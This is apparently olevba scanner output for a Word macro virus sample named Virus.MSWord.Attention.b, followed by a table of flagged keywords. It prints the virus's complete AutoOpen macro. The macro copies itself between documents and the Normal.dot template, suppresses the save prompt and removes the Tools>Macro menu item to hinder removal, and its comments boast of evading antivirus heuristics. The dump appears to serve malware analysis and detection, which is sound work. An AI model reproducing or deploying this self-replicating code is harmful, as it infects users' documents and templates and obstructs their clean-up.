olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Attention.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Attention.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Attention.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Rem ------------------------------
Rem !!!!Attention!!!!Attention!!!!
Rem ------------------------------
Rem This is *NOT* a Wazzu Varient!
Rem This Virus is called AntiFWIN!
Rem FWIN's Heuristics do not Work!
Rem ------------------------------

Public Sub MAIN()
Dim File$
Dim Global_$
Dim TheString$
Dim Macro$
Dim Return_
Dim TheFormat
On Error Resume Next

File$ = WordBasic.[FileName$]() + ":AutoOpen"
Global_$ = "Global:AutoOpen"

TheString$ = WordBasic.[MacroFileName$](WordBasic.[MacroName$](0))
Macro$ = UCase(WordBasic.[Right$](TheString$, 10))

If Macro$ = "NORMAL.DOT" Then
Return_ = CopyVirus(Global_$, File$)
TheFormat = Asc(Chr(1))
WordBasic.FileSaveAs Format:=TheFormat
Else
Return_ = CopyVirus(File$, Global_$)
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
End If

If WordBasic.[MenuItemText$]("Tools", 0, 13) = "&Macro..." Then
WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="Tools", Remove:=1
End If

End Sub

Private Function CopyVirus(From$, To_$)
On Error Resume Next
WordBasic.MacroCopy From$, To_$, 1
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

